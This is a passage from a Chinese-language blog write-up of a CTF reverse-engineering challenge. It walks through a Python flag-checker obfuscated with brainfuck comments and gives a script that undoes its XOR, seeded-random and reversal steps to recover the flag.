++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.+++++++++++.&gt;---------.&lt;-----------.&gt;&gt;++++++++++++++++.----------------------------.+++++++++++++.&lt;&lt;+++++++++++.++++++.&gt;&gt;-----------.&lt;&lt;-----------------.+++++++++++.-----------.&gt;&gt;++++++++++++++++++++++++++.----------------------------.+++++++++++++.-----------.</span></span><br><span class="line">        <span class="keyword">except</span>: <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+.+++++++++++++++++++.---------------------.++.+++++++++++.++++.&lt;------------.</span></span><br><span class="line">            flag += w[h] <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.+++++++++++.&gt;---------.&lt;-----------.&gt;&gt;++++++++++++++++.----------------------------.+++++++++++++.-----------.</span></span><br><span class="line">        h+=<span class="number">2</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++.&lt;&lt;+++++++++++++.&gt;---------.&lt;+++++++.</span></span><br><span class="line">    print(<span class="string">&quot;Final Stage complete&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;.&gt;-----------.+++++.-------------.+++++++++++.&lt;&lt;--.&gt;+++++++++++++.&gt;++++++++.&lt;++++++++++++++.++++++.--.&lt;.&gt;--.&gt;-----.--.+++.----.&lt;++.&gt;++++++++.&lt;.&lt;++.+++++++.</span></span><br><span class="line">    <span class="keyword">return</span> flag <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++.-------------.+++++++++++++++.+.---.----.&lt;&lt;++.&gt;&gt;--------.++++++.-----------.++++++.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage2</span>(<span class="params">b</span>):</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;.+.+.&lt;&lt;++.&gt;&gt;+++++++++++++.+.-------------------.++++++.--.&lt;&lt;++++++++++++++++++.----------.&gt;&gt;---.&lt;&lt;+.&gt;------------.</span></span><br><span class="line">    t = <span class="string">&quot;++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&quot;</span>[-<span class="number">15</span>:(<span class="number">7</span>*<span class="number">9</span>)].strip(<span class="string">&#x27;-&#x27;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++++.&lt;&lt;++.&gt;---------.&lt;.++.+++++++++..........&gt;&gt;-------------------------.&lt;+.&lt;.&gt;.&lt;...&gt;.&lt;.......&gt;.&lt;..........&gt;--....&lt;++.&gt;&gt;++.&lt;++....&lt;--..+++.---......+++.-...........+.---......+++.------------.&gt;&gt;--.&lt;&lt;+++++++++++.++++.++++.&gt;----.&lt;-------------.&gt;---.&lt;++.&gt;++.&lt;-.&gt;&gt;++.&lt;&lt;+++++.&gt;&gt;++++++++++++++++++++++.+.--.---------.+++++++.&lt;&lt;------.-.++++++.------.++.</span></span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)): <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.+++++++++.+++.&lt;&lt;++.&gt;&gt;-.&lt;&lt;.&gt;&gt;--------.+++++.&lt;&lt;.&gt;&gt;++++.-----------------.+++++++++++++.-------.--.&lt;&lt;++++++++.&gt;&gt;+++++++.-------.+++++++++.&lt;&lt;.&gt;&gt;------------.&lt;&lt;+..&gt;------------.</span></span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(b[q]) - randint(<span class="number">0</span>,<span class="number">5</span>)) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++++.&lt;&lt;++.+++++++++++.&gt;---------.&lt;-----------.&gt;&gt;-----------------.+++++.++++++++++.&lt;&lt;++++++++.&gt;&gt;---.+++.--------------.&lt;&lt;.&gt;&gt;--.-------.++++++++++++++++++++++.--------------------.&lt;&lt;+.++++.&gt;&gt;+++++++++++++++++++++.-----------------.+++++++++++++.----------.+++++.+++++.++++++.&lt;&lt;-----.++++++++.----.&gt;--------.&lt;---..</span></span><br><span class="line">    print(<span class="string">&quot;Stage 2 complete&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;+++++++++++++.&gt;.&lt;++++++++++++++.++++++.--.&lt;--.++++++++++++++++++.------------------.&gt;--.&gt;-----.--.+++.----.&lt;++.&gt;++++++++.&lt;.&lt;++.+++++++.</span></span><br><span class="line">    flag = finalstage(t) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;-.+++.+++++.-------------.+++++++++++.+++++++.+.-------------------.++++++.--.&lt;&lt;++++++++.&gt;&gt;+++++++++++++++.&lt;&lt;+.</span></span><br><span class="line">    <span class="keyword">return</span> flag <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++.-------------.+++++++++++++++.+.---.----.&lt;&lt;++.&gt;&gt;--------.++++++.-----------.++++++.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage1</span>(<span class="params">a</span>):</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;.+.+.&lt;&lt;++.&gt;&gt;+++++++++++++.+.-------------------.++++++.--.&lt;&lt;+++++++++++++++++.---------.&gt;&gt;----.&lt;&lt;+.&gt;------------.</span></span><br><span class="line">    a = <span class="built_in">list</span>(a) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;---.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;+++++++++++.---.++++++++++.+.&lt;&lt;++++++++.&gt;&gt;-------------------.&lt;&lt;+.</span></span><br><span class="line">    b = <span class="built_in">list</span>(string.ascii_lowercase) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;--.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++++++.---.++++++++++.+.&lt;&lt;++++++++.&gt;&gt;-.+.--.---------.+++++.-------.&lt;&lt;++++++.&gt;&gt;------.++++++++++++++++++.----------------.++++++..----------.+++++++++++++.+++.++++++++.------------------.+++++++++++++.---------------.--.++++++++++++++++++.--------------.&lt;&lt;-----.</span></span><br><span class="line">    <span class="keyword">for</span> o <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)): <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.+++++++++.+++.&lt;&lt;++.&gt;&gt;---.&lt;&lt;.&gt;&gt;------.+++++.&lt;&lt;.&gt;&gt;++++.-----------------.+++++++++++++.-------.--.&lt;&lt;++++++++.&gt;&gt;+++++++.-------.+++++++++.&lt;&lt;.&gt;&gt;-------------.&lt;&lt;+..&gt;------------.</span></span><br><span class="line">        a[o] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[o])^o) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;---.------.++++++++++++++++++++.------------------.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++.+++++.++++++++++.&lt;&lt;++++++++.&gt;&gt;---.+++.--------------.&lt;&lt;.&gt;&gt;---.------.++++++++++++++++++++.------------------.&lt;&lt;+.&gt;&gt;+.+++++++++++++++++.&lt;&lt;</span></span><br><span class="line">    z = <span class="string">&quot;&quot;</span>.join(x <span class="keyword">for</span> x <span class="keyword">in</span> a) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++++++++++.&lt;&lt;++.&gt;---------.&lt;.++..++++++++++++.&gt;&gt;----------------.+++++.------.+++++.&lt;&lt;------.&gt;&gt;++++++++++.&lt;&lt;--------.&gt;&gt;------------------.+++++++++.+++.&lt;&lt;.&gt;&gt;++++++.&lt;&lt;.&gt;&gt;---------------.+++++.&lt;&lt;.&gt;&gt;-------------.&lt;&lt;+++++++++.</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(z)): <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.+++++++++.+++.&lt;&lt;++.&gt;&gt;+++++++.&lt;&lt;.&gt;&gt;----------------.+++++.&lt;&lt;.&gt;&gt;++++.-----------------.+++++++++++++.-------.--.&lt;&lt;++++++++.&gt;&gt;+++++++.-------.+++++++++.&lt;&lt;.&gt;&gt;++++++++++++.&lt;&lt;+..&gt;------------.</span></span><br><span class="line">        b[y%<span class="built_in">len</span>(b)] = <span class="built_in">chr</span>((  <span class="built_in">ord</span>(z[y]) ^ <span class="built_in">ord</span>(a[y]) ) + <span class="built_in">len</span>(b)  ) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;--.-------.++++++++++++++++++++++++++++++.&lt;&lt;+++++++.&gt;&gt;-------------.-------.+++++++++.&lt;&lt;+++.&gt;&gt;------------.&lt;&lt;+.&gt;&gt;-----.&lt;&lt;---------.&gt;---------.&lt;.&gt;&gt;++++++.+++++.++++++++++.&lt;&lt;++++++++..&gt;&gt;---.+++.--------------.&lt;&lt;.&gt;&gt;++++++++++++++++++++++.&lt;++++++++++++++++++++++++++++++.&gt;-.&lt;++.&lt;+.&gt;+.&gt;----------.+++.&lt;++++++.&lt;-.&gt;---.------.&gt;+++++++.&lt;++.&lt;+..++.&gt;&gt;-------------.-------.+++++++++.&lt;&lt;---.&gt;+++++.&lt;+..</span></span><br><span class="line">    print(<span class="string">&quot;Stage 1 complete&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;+++++++++++++.&gt;.&lt;++++++++++++++.++++++.--.&lt;--.+++++++++++++++++.-----------------.&gt;--.&gt;-----.--.+++.----.&lt;++.&gt;++++++++.&lt;.&lt;++.+++++++.</span></span><br><span class="line">    flag = stage2(z) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++++++++.+.-------------------.++++++.--.&lt;-----------.&lt;++++++++.&gt;&gt;+++++++++++++++++++++.&lt;&lt;+.</span></span><br><span class="line">    <span class="keyword">return</span> flag <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++.-------------.+++++++++++++++.+.---.----.&lt;&lt;++.&gt;&gt;--------.++++++.-----------.++++++.</span></span><br><span class="line"><span class="comment"># QBPKxH.u&quot;F1fRy3U[bM36j]QvS=03*]o0feA|</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry</span>(<span class="params">f</span>):</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;.+.+.&lt;&lt;++.&gt;&gt;-.+++++++++.++++++.--.+++++++.&lt;&lt;++++++++.&gt;&gt;-------------------.&lt;&lt;+.&gt;------------.</span></span><br><span class="line">    seed(<span class="number">10</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++.--------------..-.&lt;&lt;++++++++++.+++++++++.-.-------.</span></span><br><span class="line">    f = <span class="built_in">list</span>(f) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++.---.++++++++++.+.&lt;&lt;++++++++.&gt;&gt;--------------.&lt;&lt;+.</span></span><br><span class="line">    f.reverse() <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.&lt;&lt;++++++++++++++++.&gt;&gt;++++++++++++.-------------.+++++++++++++++++.-----------------.+++++++++++++.+.--------------.&lt;&lt;------.+.</span></span><br><span class="line">    f = <span class="string">&quot;&quot;</span>.join(i <span class="keyword">for</span> i <span class="keyword">in</span> f) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.&lt;&lt;++.&gt;---------.&lt;.++..++++++++++++.&gt;&gt;++++.+++++.------.+++++.&lt;&lt;------.&gt;&gt;-----.&lt;&lt;--------.&gt;&gt;---.+++++++++.+++.&lt;&lt;.&gt;&gt;---------.&lt;&lt;.&gt;&gt;.+++++.&lt;&lt;.&gt;&gt;--------.&lt;&lt;+++++++++.</span></span><br><span class="line">    print(<span class="string">&quot;Entry complete&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;-.&gt;------.++++++.--.+++++++.&lt;&lt;--.&gt;&gt;----------------------.++++++++++++.--.+++.----.-------.+++++++++++++++.---------------.&lt;&lt;++.+++++++.</span></span><br><span class="line">    flag = stage1(f) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++++++++.+.-------------------.++++++.--.&lt;------------.&lt;++++++++.&gt;&gt;+.&lt;&lt;+.</span></span><br><span class="line">    <span class="keyword">return</span> flag <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++.-------------.+++++++++++++++.+.---.----.&lt;&lt;++.&gt;&gt;--------.++++++.-----------.++++++.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:<span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.---.&lt;&lt;++.&gt;&gt;-------..+++++++++++++++.-------------.++++++++++++.--------.------..&lt;&lt;.&gt;---------..&lt;.+++++++.&gt;&gt;..++++++++++++++.------------.++++++++.+++++.---------------..&lt;&lt;.&gt;---.</span></span><br><span class="line">    <span class="comment"># input = entry(input(&quot;Enter Flag: &quot;)) # ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.+++++.++.+++++.-.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;---------------.+++++++++.++++++.--.+++++++.&lt;&lt;++++++++.&gt;&gt;----------------.+++++.++.+++++.-.&lt;&lt;.------.&gt;++++++++.&gt;------.++++++.---------------.+++++++++++++.&lt;&lt;--.&gt;+.&gt;------.-----------.++++++.&lt;------------.&lt;.++.+++++++..</span></span><br><span class="line">    <span class="built_in">input</span> = entry(<span class="string">&#x27;QBPKxH.u&quot;F1fRy3U[bM36j]QvS=03*]o0feA|&#x27;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.+++++.++.+++++.-.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;---------------.+++++++++.++++++.--.+++++++.&lt;&lt;++++++++.&gt;&gt;----------------.+++++.++.+++++.-.&lt;&lt;.------.&gt;++++++++.&gt;------.++++++.---------------.+++++++++++++.&lt;&lt;--.&gt;+.&gt;------.-----------.++++++.&lt;------------.&lt;.++.+++++++..</span></span><br><span class="line">    flag = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()[<span class="number">0</span>] <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++++.+.-----------.+++++++++.&lt;&lt;++++++++.-.&gt;&gt;+.++++++.-.----.+++++.-.&lt;&lt;+++++++.&gt;&gt;.++++.----.&lt;&lt;-------.+++++.------------.+++++++.&gt;&gt;--.&lt;&lt;.++.+++++.&gt;&gt;.-------------.----.+++.++++++++.---.+++++.---------.++++++++++++++.&lt;&lt;------.+.&gt;&gt;------------------------.&lt;&lt;+++++++.&gt;&gt;++.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">input</span> == flag: <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.---.&lt;&lt;++.&gt;&gt;+++.+++++.++.+++++.-.&lt;&lt;.&gt;---------..&lt;.&gt;&gt;--------------.++++++.-----------.++++++.&lt;---.</span></span><br><span class="line">        print(<span class="string">&quot;What... how?&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;+++++++++++++++++.&gt;------------.-------.+++++++++++++++++++.&lt;&lt;++++++++++++...--------------.&gt;&gt;------------.+++++++.++++++++.&lt;------------------------.&lt;++.+++++++.</span></span><br><span class="line">        print(<span class="string">&quot;I guess you broke my &#x27;beautiful&#x27; code :(&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;+++.&lt;--.&gt;&gt;-------------.++++++++++++++.----------------.++++++++++++++..&lt;&lt;.&gt;&gt;++++++.----------.++++++.&lt;&lt;.&gt;&gt;-------------------.++++++++++++++++.---.----.------.&lt;&lt;.&gt;&gt;++++++++.++++++++++++.&lt;&lt;.+++++++.&gt;&gt;-----------------------.+++.----.++++++++++++++++++++.-.-----------.---.+++++++++++++++.---------.&lt;&lt;.-------.&gt;&gt;---------.++++++++++++.-----------.+.&lt;&lt;.&gt;---------------.&lt;++++++++.------.+++++++.</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+.+++++++.+++++++.--------------.&lt;------------.</span></span><br><span class="line">        print(<span class="string">&quot;haha, nope. Try again!&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;&gt;------------.-------.+++++++.-------.&lt;&lt;++++++++++.------------.&gt;&gt;+++++++++++++.+.+.-----------.&lt;&lt;++++++++++++++.--------------.&gt;++++++++++++++.&gt;+++++++++++++.+++++++.&lt;&lt;.&gt;+++++++++++++.++++++.------.++++++++.+++++.&lt;+.+.+++++++.</span></span><br></pre></td></tr></table></figure>
<p>注释是源代码的brainfuck编码，我一开始还以为源代码是假的，brainfuck解码出来才是真的，没想到真一模一样（</p>
<p>代码的流程为，flag先进入entry函数，然后倒序，进入stage1</p>
<p>stage1的流程为，每个位置上的字符与其序号进行一次异或，然后传入stage2</p>
<p>stage2的流程为，新建一个空变量t（那串brainfuck是混淆代码，其实就是空字符串），然后传入的flag每个都进行了一次减法，此处随机数为伪随机，完全可复现，然后传入finalstage</p>
<p>finalstage的流程为，将flag逆序一次，然后两两一组将flag调换一下，由于flag为奇数，故最后一个flag的字符不变</p>
<p>很简单，只要照着流程逆序即可：</p>
<p><code>result两两调换 -&gt; 逆序 -&gt; 按照随机数加一个值 -&gt; 与自己位置上的字符进行异或 -&gt; 逆序</code></p>
<p>解密脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    result = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()[<span class="number">0</span>] </span><br><span class="line"></span><br><span class="line">    h = <span class="number">0</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> h &lt; <span class="built_in">len</span>(result): </span><br><span class="line">        <span class="keyword">try</span>: </span><br><span class="line">            flag += result[h+<span class="number">1</span>] + result[h] </span><br><span class="line">        <span class="keyword">except</span>: </span><br><span class="line">            flag += result[h] </span><br><span class="line">        h += <span class="number">2</span> </span><br><span class="line">    </span><br><span class="line">    flag = <span class="built_in">list</span>(flag)</span><br><span class="line">    flag.reverse()</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">    seed(<span class="number">10</span>)</span><br><span class="line">    fake_random = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">        fake_random.append(randint(<span class="number">0</span>, <span class="number">5</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># fake_random.reverse()</span></span><br><span class="line">    new_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        new_flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) + fake_random[i])</span><br><span class="line">    </span><br><span class="line">    print(new_flag)</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(new_flag)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(new_flag[i]) ^ i)</span><br><span class="line">    </span><br><span class="line">    print(flag)</span><br><span class="line">    </span><br><span class="line">    flag = <span class="built_in">list</span>(flag)</span><br><span class="line">    flag.reverse()</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span>.join(flag)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
<p>有个坑点，就是python2和python3的种子会有差异，要用python3来跑这个脚本</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Alex</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/09/11/PCTF-wp/">http://example.com/2023/09/11/PCTF-wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com">Alex's blog~</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/misc/">misc</a><a class="post-meta__tags" href="/tags/write-up/">write up</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2023/09/16/LJB-2023/"><i class="fa fa-chevron-left">  </i><span>陇剑杯被薄纱之旅</span></a></div><div class="next-post pull-right"><a href="/2023/07/16/Java-Ser-CC1/"><span>Java-Ser-CC1</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2021.03.05 - 2023 By Alex</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>